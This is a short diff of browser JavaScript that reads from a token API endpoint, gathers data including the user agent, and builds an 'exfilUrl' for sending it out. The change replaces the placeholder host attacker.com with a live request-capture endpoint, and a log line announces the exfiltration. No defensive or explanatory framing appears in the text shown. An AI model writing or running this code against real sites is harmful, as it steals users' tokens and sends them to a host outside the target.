@@ -12,7 +12,7 @@ fetch("/api/tokens/697a3b225493767b73bb7bd8", {
     ua: navigator.userAgent
   };
 
-  const exfilUrl = "https://attacker.com?data=" + encodeURIComponent(JSON.stringify(payload));
+  const exfilUrl = "https://eoeqgca83zpr7tb.m.pipedream.net?data=" + encodeURIComponent(JSON.stringify(payload));
 
   console.log("[+] Exfiltrating to:", exfilUrl);
 
